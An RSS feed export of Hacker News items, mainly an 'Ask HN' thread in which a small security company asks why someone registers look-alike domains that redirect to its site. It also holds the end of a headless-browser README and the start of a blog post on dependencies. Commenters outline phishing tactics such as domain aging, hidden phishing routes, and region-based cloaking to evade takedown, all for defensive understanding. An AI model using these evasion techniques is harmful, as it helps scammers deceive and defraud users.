<p dir="auto"><h4 tabindex="-1" dir="auto">Step by step build dependancy</h4><a id="user-content-step-by-step-build-dependancy" aria-label="Permalink: Step by step build dependancy" href="#step-by-step-build-dependancy"></a></p>
<p dir="auto">The project uses git submodules for dependencies.</p>
<p dir="auto">To init or update the submodules in the <code>vendor/</code> directory:</p>

<p dir="auto"><strong>Netsurf libs</strong></p>
<p dir="auto">Netsurf libs are used for HTML parsing and DOM tree generation.</p>

<p dir="auto">For dev env, use <code>make install-netsurf-dev</code>.</p>
<p dir="auto"><strong>Mimalloc</strong></p>
<p dir="auto">Mimalloc is used as a C memory allocator.</p>

<p dir="auto">For dev env, use <code>make install-mimalloc-dev</code>.</p>
<p dir="auto">Note: when Mimalloc is built in dev mode, you can dump memory stats with the
env var <code>MIMALLOC_SHOW_STATS=1</code>. See
<a href="https://microsoft.github.io/mimalloc/environment.html" rel="nofollow">https://microsoft.github.io/mimalloc/environment.html</a>.</p>
<p dir="auto"><strong>zig-js-runtime</strong></p>
<p dir="auto">Our own Zig/Javascript runtime, which includes the v8 Javascript engine.</p>
<p dir="auto">This build task is very long and cpu consuming, as you will build v8 from sources.</p>
<div data-snippet-clipboard-copy-content="make install-zig-js-runtime"><pre><code>make install-zig-js-runtime
</code></pre></div>
<p dir="auto">For dev env, use <code>make iinstall-zig-js-runtime-dev</code>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Test</h2><a id="user-content-test" aria-label="Permalink: Test" href="#test"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Unit Tests</h3><a id="user-content-unit-tests" aria-label="Permalink: Unit Tests" href="#unit-tests"></a></p>
<p dir="auto">You can test Lightpanda by running <code>make test</code>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Web Platform Tests</h3><a id="user-content-web-platform-tests" aria-label="Permalink: Web Platform Tests" href="#web-platform-tests"></a></p>
<p dir="auto">Lightpanda is tested against the standardized <a href="https://web-platform-tests.org/" rel="nofollow">Web Platform
Tests</a>.</p>
<p dir="auto">The relevant tests cases are committed in a <a href="https://github.com/lightpanda-io/wpt">dedicated repository</a> which is fetched by the <code>make install-submodule</code> command.</p>
<p dir="auto">All the tests cases executed are located in the <code>tests/wpt</code> sub-directory.</p>
<p dir="auto">For reference, you can easily execute a WPT test case with your browser via
<a href="https://wpt.live/" rel="nofollow">wpt.live</a>.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Run WPT test suite</h4><a id="user-content-run-wpt-test-suite" aria-label="Permalink: Run WPT test suite" href="#run-wpt-test-suite"></a></p>
<p dir="auto">To run all the tests:</p>

<p dir="auto">Or one specific test:</p>
<div data-snippet-clipboard-copy-content="make wpt Node-childNodes.html"><pre><code>make wpt Node-childNodes.html
</code></pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Add a new WPT test case</h4><a id="user-content-add-a-new-wpt-test-case" aria-label="Permalink: Add a new WPT test case" href="#add-a-new-wpt-test-case"></a></p>
<p dir="auto">We add new relevant tests cases files when we implemented changes in Lightpanda.</p>
<p dir="auto">To add a new test, copy the file you want from the <a href="https://github.com/web-platform-tests/wpt">WPT
repo</a> into the <code>tests/wpt</code> directory.</p>
<p dir="auto"><g-emoji alias="warning">⚠️</g-emoji> Please keep the original directory tree structure of <code>tests/wpt</code>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Lightpanda accepts pull requests through GitHub.</p>
<p dir="auto">You have to sign our <a href="https://github.com/lightpanda-io/browser/blob/main/CLA.md">CLA</a> during the pull request process otherwise
we're not able to accept your contributions.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why?</h2><a id="user-content-why" aria-label="Permalink: Why?" href="#why"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Javascript execution is mandatory for the modern web</h3><a id="user-content-javascript-execution-is-mandatory-for-the-modern-web" aria-label="Permalink: Javascript execution is mandatory for the modern web" href="#javascript-execution-is-mandatory-for-the-modern-web"></a></p>
<p dir="auto">In the good old days, scraping a webpage was as easy as making an HTTP request, cURL-like. It’s not possible anymore, because Javascript is everywhere, like it or not:</p>
<ul dir="auto">
<li>Ajax, Single Page App, infinite loading, “click to display”, instant search, etc.</li>
<li>JS web frameworks: React, Vue, Angular &amp; others</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Chrome is not the right tool</h3><a id="user-content-chrome-is-not-the-right-tool" aria-label="Permalink: Chrome is not the right tool" href="#chrome-is-not-the-right-tool"></a></p>
<p dir="auto">If we need Javascript, why not use a real web browser? Take a huge desktop application, hack it, and run it on the server. Hundreds or thousands of instances of Chrome if you use it at scale. Are you sure it’s such a good idea?</p>
<ul dir="auto">
<li>Heavy on RAM and CPU, expensive to run</li>
<li>Hard to package, deploy and maintain at scale</li>
<li>Bloated, lots of features are not useful in headless usage</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Lightpanda is built for performance</h3><a id="user-content-lightpanda-is-built-for-performance" aria-label="Permalink: Lightpanda is built for performance" href="#lightpanda-is-built-for-performance"></a></p>
<p dir="auto">If we want both Javascript and performance in a true headless browser, we need to start from scratch. Not another iteration of Chromium, really from a blank page. Crazy right? But that’s we did:</p>
<ul dir="auto">
<li>Not based on Chromium, Blink or WebKit</li>
<li>Low-level system programming language (Zig) with optimisations in mind</li>
<li>Opinionated: without graphical rendering</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Status</h2><a id="user-content-status" aria-label="Permalink: Status" href="#status"></a></p>
<p dir="auto">Lightpanda is still a work in progress and is currently at a Beta stage.</p>
<p dir="auto"><g-emoji alias="warning">⚠️</g-emoji> You should expect most websites to fail or crash.</p>
<p dir="auto">Here are the key features we have implemented:</p>
<ul>
<li> HTTP loader</li>
<li> HTML parser and DOM tree (based on Netsurf libs)</li>
<li> Javascript support (v8)</li>
<li> Basic DOM APIs</li>
<li> Ajax
<ul>
<li> XHR API</li>
<li> Fetch API</li>
</ul>
</li>
<li> DOM dump</li>
<li> Basic CDP/websockets server</li>
</ul>
<p dir="auto">NOTE: There are hundreds of Web APIs. Developing a browser (even just for headless mode) is a huge task. Coverage will increase over time.</p>
<p dir="auto">You can also follow the progress of our Javascript support in our dedicated <a href="https://github.com/lightpanda-io/zig-js-runtime#development">zig-js-runtime</a> project.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Why buy domains and 301 redirect them to me? (122 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=42812779</link>
            <guid>42812779</guid>
            <pubDate>Fri, 24 Jan 2025 13:20:56 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=42812779">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <tbody><tr id="42813335"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813335" href="https://news.ycombinator.com/vote?id=42813335&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>As others have mentioned this is likely one of a couple of scenarios, roughly ordered by my guess on likelihood:</p><p>- Attempting to use your legitimate content and services to improve the SEO rank of other domains (even unrelated ones). This can usually be checked by looking for a sitemap.xml, there will be pages not redirected to your site that contain pages of links.</p><p>- Closely following the above, the pages may not be links to other sites but might be hosting phishing pages for other services unrelated to yours. The redirect here acts as a bluff for casual inspection of the domain. You won't see page entries in a sitemap.xml file for these ones.</p><p>- Attempting to "age" a domain. Not many talk about this option, but new domains are a red flag to a lot of automated security processes. When purchasing a domain and giving it a history associated with a legitimate service they make the domain look less suspicious for future malicious use.</p><p>- Preparation for a targeted campaign. This is pretty unlikely, you need to be really worth a dedicated long term campaign effort specifically against you or your company. If you're doing controversial/novel research, are managing millions of dollars, performing a service a state actor would object to, or have high profile clientele then maybe you fall into this category. These are patient campaigns and want to make the domain "feel normal and official". They won't do anything public with the domain such as SEO tweaking or link spam, they'll use these domains only for specific targeted one-off low-noise attacks. They're relying on staff to see that the domain has been connected to your service for years and is likely just a domain someone in marketing purchased and forgot about. This is exceptionally rare.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="42814229"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42814229" href="https://news.ycombinator.com/vote?id=42814229&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Regarding point two, OP should connect to a VPN in Japan or somewhere he very isn't, use incognito mode, and see if the same content is served. I've seen hacked sites that are set up to serve normal content to where the attacker thinks the owner of the site lives, but serve phishing content or malware or whatever to everywhere else.</p><p>A 301 fits that bill because then the owners browser even when traveling will serve the good content</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="42814698"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_42814698" href="https://news.ycombinator.com/vote?id=42814698&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Yeah this is a good call-out. If the site is being used for drive-by or targeted malware there are other checks that may be happening alongside the redirect such as user agent, country of origin (like you mentioned), plugins installed, OS, or even time of day.</p><p>If they detect something that matches what they want, they may throw some intermediate 301's to pages that attempt to infect the user with something still ultimately redirecting to the "normal" page.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="42813477"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42813477" href="https://news.ycombinator.com/vote?id=42813477&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>I think the first one is pretty likely.</p><p>OP, you can search for "site:getexample.com" which will list you any pages that have been indexed for that domain. They <i>might</i> have just redirected the homepage. Worth a shot.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813792"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42813792" href="https://news.ycombinator.com/vote?id=42813792&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>It could be a combo of 1 and 3: a competitor (or someone who thinks they might be in the future) ages those domains, then points it to their own product later.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                  <tr id="42813194"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813194" href="https://news.ycombinator.com/vote?id=42813194&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>Their play is to send emails with those domains but in the emails claiming to be you and when people reading the email go to the domain, they see your page (they got redirected).</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42812868"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42812868" href="https://news.ycombinator.com/vote?id=42812868&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>They'll weaponize them at some point. How exactly is to be seen, but if people associate your product with domains you do not control (e.g. via SEO searches and hyperlinks left in public places), then everyone is on the hook the moment these domains stop redirecting to your service.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813040"><td></td></tr>
            <tr id="42812913"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42812913" href="https://news.ycombinator.com/vote?id=42812913&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>It’s possible `/` redirects but other hidden routes phish. If someone gets e.g.: a fake password reset email, it might help the attacker bypass sanity checks users make.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="42813132"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42813132" href="https://news.ycombinator.com/vote?id=42813132&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Also helps create phishing report "false" flags.</p><p>If I target a specific region with a phishing link and redirect if the requestor is not in that region I can probably maintain my phishing domains for longer.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="42814455"><td></td></tr>
            <tr id="42813296"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813296" href="https://news.ycombinator.com/vote?id=42813296&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>I think you can check the HTTP_REFERER header and block the redirect using your back-end code, like PHP or Node or Python, not sure what tech stack you are using.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="42813457"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42813457" href="https://news.ycombinator.com/vote?id=42813457&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>The right play might be to have a custom landing page or header / popup on your site indicating that they were referred by a fraudulent domain, and to please bookmark your proper domain / report if this was via an email link. The traffic might be good, just coming in through a bad actor.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="42814403"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_42814403" href="https://news.ycombinator.com/vote?id=42814403&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>No, just redirect back to HTTP_REFERER. Why?</p><p>The user's browser will display a redirect loop error; and most importantly, they won't see your domain.</p><p>It keeps your name out of it and makes the email domain look even more fishy.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="42814170"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42814170" href="https://news.ycombinator.com/vote?id=42814170&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>The referer is the site that sent the user to the redirect, not the redirect itself. You cannot detect 301s from the destination only.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813355"><td></td></tr>
                  <tr id="42812870"><td></td></tr>
                <tr id="42814181"><td></td></tr>
            <tr id="42812964"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42812964" href="https://news.ycombinator.com/vote?id=42812964&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>Presumably just throwing a 403 if they have this referrer is ok and won't have a weird SEO impact or something?</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="42813213"><td></td></tr>
                <tr id="42813327"><td></td></tr>
                <tr id="42814198"><td></td></tr>
            <tr id="42813523"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_42813523" href="https://news.ycombinator.com/vote?id=42813523&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>I just tested on firefox and it doesn't send the "Origin" header when using referrerpolicy="no-referrer". It's also not present when navigating using the url bar directly.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                        <tr id="42813029"><td></td></tr>
                        <tr id="42813099"><td></td></tr>
            <tr id="42813174"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813174" href="https://news.ycombinator.com/vote?id=42813174&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>I don't know if it still happens, but Google used to have an issue that I would see in Verbatim mode whereby non-Wikipedia domains would rank as particular Wikipedia pages by redirecting to Wikipedia. I can't seem to replicate it now, so it might be resolved or vary from country to country.</p><p>I posted about it at the time, but no one seemed to be able to replicate it:</p><p><a href="https://x.com/jfozonx/status/1570710776540958723" rel="nofollow">https://x.com/jfozonx/status/1570710776540958723</a></p><p>Always wondered how much traffic those domains were accumulating. Even though it was an edge case, it must've been quite a lot in aggregate.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813187"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813187" href="https://news.ycombinator.com/vote?id=42813187&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Yes, phishing. It might happen in the future, it could be happening right now, emails from getexample.com, a specific path on getexample.com that doesn't redirect to the real thing, etc.</p><p>File a DMCA with the registrar and the hosting provider.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="42812920"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42812920" href="https://news.ycombinator.com/vote?id=42812920&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>Do you have an affiliate plan, or likely to have one?  Maybe they plan to redirect with their affiliate ID at some point?</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="42812957"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42812957" href="https://news.ycombinator.com/vote?id=42812957&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Don't have an affiliate program, and I don't think we've got anything to suggest we will have one in the future (frankly our billing process is pretty bare bones and affiliate stuff isn't something we're looking at right now).</p><p>We're a small bot security/captcha company and pretty regularly get various attacks thrown at us - figuring out if somebody is up to something more along those lines was my main concern.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="42813502"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813502" href="https://news.ycombinator.com/vote?id=42813502&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>I’ve seen one or two domains like that serving 301s to some IPs and their own website to others. This could be a 1000:1 ratio. Then they serve an absolutely ad-infested parking page-style website to those others. And that’s how they skim a little bit of revenue off your customers.</p><p>They may also represent you to real life businesses for invoice scams or credit.</p><p>Rare but possible scenarios worth considering.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813757"><td></td></tr>
            <tr id="42813310"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813310" href="https://news.ycombinator.com/vote?id=42813310&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>This feels like a never-ending cat and mouse activity, but depending upon your hosting infrastructure, you ought to be able to maintain a list of these domains and 403/404 incoming requests that are being referred from the list. Better to just dump them to an error / scam warning page than 301 them out to somewhere else (to avoid redirect loops)</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813421"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813421" href="https://news.ycombinator.com/vote?id=42813421&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>Could be for phishing. Is the SAAS in a domain that involves money (payments/crypto etc) ? Then even more likely so. I would drop those redirects at my webserver level. Easy to d0.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813384"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813384" href="https://news.ycombinator.com/vote?id=42813384&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>Another alternative is that they will hijack those links once they gain traction in search results. Almost as a hedge against your future success.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813051"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813051" href="https://news.ycombinator.com/vote?id=42813051&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>it can bypass some whitelisting if you for example have redirects checking if address is example.com but validation is poorly written ("startswith", "contains") , on login page or anywhere else.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42812995"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42812995" href="https://news.ycombinator.com/vote?id=42812995&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Can you provide more information about what's in the headers? Additionally, are there any tracking parameters appended to the URL?</p><p>I'm guessing it will look normal but it could provide some insights if something weird is there.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="42813188"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42813188" href="https://news.ycombinator.com/vote?id=42813188&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Just had a look - looks like pretty regular/reasonable cloudflare default stuff as far as I can tell. The headers relating to error reporting are the only thing that stand out a little, though it doesn't look unreasonable.</p><p>---</p><p>Headers</p><p>---</p><p>HTTP/2 301</p><p>date: Fri, 24 Jan 2025 13:59:51 GMT</p><p>content-type: text/html</p><p>content-length: 167</p><p>location: &lt;the website in question&gt;</p><p>cache-control: max-age=3600</p><p>expires: Fri, 24 Jan 2025 14:59:51 GMT</p><p>report-to: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=JZu4FOa%2ByynaFOXWYlxaePF9KdRQ0qGUJkfm1F1aK2m3VEx6idlvWlb5go%2B08hgSog1zm1zuMobXcVK2BkR4mQD0SEGU%2Bzp2oC6mXPgQs%2FUzvOH7LbqAG96jtf9KNqemV8Q%3D"}],"group":"cf-nel","max_age":604800}</p><p>nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}</p><p>server: cloudflare</p><p>cf-ray: 90708be24810e8fe-LHR</p><p>alt-svc: h3=":443"; ma=86400</p><p>server-timing: cfL4;desc="?proto=TCP&amp;rtt=59748&amp;min_rtt=41108&amp;rtt_var=43898&amp;sent=7&amp;recv=8&amp;lost=0&amp;retrans=1&amp;sent_bytes=3535&amp;recv_bytes=789&amp;delivery_rate=33797&amp;cwnd=225&amp;unsent_bytes=0&amp;cid=e5052200af7e27a5&amp;ts=145&amp;x=0"</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="42813881"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_42813881" href="https://news.ycombinator.com/vote?id=42813881&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>If you are seeing 301s logged on your end that is your site redirecting to another one.</p><p>There isn’t a way to see what a referring site did to do the redirect (301 or 302 or even a js redirect) in your logs. All you’ll see is (potentially) the Referer http header.</p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="42812876"><td></td></tr>
                <tr id="42813169"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42813169" href="https://news.ycombinator.com/vote?id=42813169&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>This sounds very plausible. Then if they click on their link or manually type in the website corresponding to the e-mail address, it goes to your (very official) site.</p><p>Of all the answers presented so far, this one feels the most plausible to me.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="42813361"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813361" href="https://news.ycombinator.com/vote?id=42813361&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Phishing. Regular visits to these domains will 301 redirect them to you, but there's at least one URL that will instead be handled by the scammers themselves.</p><p>They'll then send out an email campaign with a From: address in the counterfeit domain (which will have valid SPF/DKIM/whatever), a subject like "Example.com: You've been invited to join a project!", quickly-come-see-this-secret-stuff body copy, and a call-to-action button linked to that URL.</p><p>The page hosted on the URL will have your branding and everything, and collect a bunch of personal information and/or access credentials for the scammers.</p><p>Taking down this stuff is tedious, but you can try -- least you can do for now is display a prominent 'this is not an authorized example.com domain' warning for inbound visits from these redirects, create a public Knowledge Base-like article warning about this abuse as well (making very clear this has nothing to do with you), and block the domains involved on your inbound mail server.</p><p>Silver lining: apparently your SaaS is successful enough to be used as a lure for scammers. Congrats?</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813315"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813315" href="https://news.ycombinator.com/vote?id=42813315&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>I did this for a fraudulent health product. They had .org but not .com. Registered .com and redirected it. Waited for SEO to pick up on it. Created the page calling it out as fraud. Created some social media accounts and put the .com in the about info. Started commenting on their posts, anyone that looked at the fake profiles would find my page with info on why it was fraudulent.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="42813871"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42813871" href="https://news.ycombinator.com/vote?id=42813871&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Whatever their plan - if you have a trademark or similar IP protection on "Example", that might be prove extremely useful here.  (If not - consider getting some protection ASAP.)</p><p>It's been a while, and IANAL - but I've seen both domain resellers and registrars cave pretty quickly when contacted with "that name very obviously infringes on our trademark".</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="42812855"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_42812855" href="https://news.ycombinator.com/vote?id=42812855&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>People do this for SEO purposes. They think that this increases the amount of backlinks to their site, thus increasing their rank in Google and other search engines.</p><p>This is less true than it used to be, but people still do it.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="42812890"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42812890" href="https://news.ycombinator.com/vote?id=42812890&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Sure, but it's not their site, it's mine!</p><p>And they're not obvious mouse slips like redirecting googl.com -&gt; google.com - they're more of the form &lt;verb&gt;mydomain.com.</p><p>I was mostly interested in what the actual play from them here is tbh</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="42812985"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_42812985" href="https://news.ycombinator.com/vote?id=42812985&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>Maybe they’ll try to build up traffic to your site from those domains and then push to sell them to you/extort by removing the redirects?</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="42813055"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_42813055" href="https://news.ycombinator.com/vote?id=42813055&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div>
                  <p>Just feels like such an odd play lol. If they could organically generate leads/traffic that I'd be willing to get extorted over, then surely they would also have the means to start a marketing agency that I'd be willing to pay far more for?</p>
              </div></td></tr>
        </tbody></table></td></tr>
                        <tr id="42812888"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_42812888" href="https://news.ycombinator.com/vote?id=42812888&amp;how=up&amp;goto=item%3Fid%3D42812779"></a></center>    </td><td><br><div><p>Backlinks to <i>which</i> site?</p><p>The fraudulent domains are only sending traffic to OP.</p><p>My guess is that they want to either phish visitors, or they want to ask OP for affiliate  revenue, like a digital version of the guys who wash your windshield or your shoes without asking first, and then ask for money.</p><p>Or planning to threaten to divert organic traffic through the impersonation domains away from the canonical domain, if you don't pay them.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="42813454"><td></td></tr>
                        </tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Build It Yourself (192 pts)]]></title>
            <link>https://lucumr.pocoo.org/2025/1/24/build-it-yourself/</link>
            <guid>42812641</guid>
            <pubDate>Fri, 24 Jan 2025 12:55:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lucumr.pocoo.org/2025/1/24/build-it-yourself/">https://lucumr.pocoo.org/2025/1/24/build-it-yourself/</a>, See on <a href="https://news.ycombinator.com/item?id=42812641">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
  

  
  <p>written on Friday, January 24, 2025</p>
  

  <p>Another day, another <a href="https://lucumr.pocoo.org/2016/3/24/open-source-trust-scaling/">rant</a>
<a href="https://lucumr.pocoo.org/2022/1/10/dependency-risk-and-funding/">about</a> <a href="https://lucumr.pocoo.org/2024/3/26/rust-cdo/">dependencies</a>. from me.  This time I will ask you that we
start and support a vibe shift when it comes to dependencies.</p>
<p>You're probably familiar with the concept of “dependency churn.”  It's that
never-ending treadmill of updates, patches, audits, and transitive
dependencies that we as developers love to casually install in the name of
productivity.  Who doesn't enjoy waiting for yet another <cite>cargo upgrade</cite>
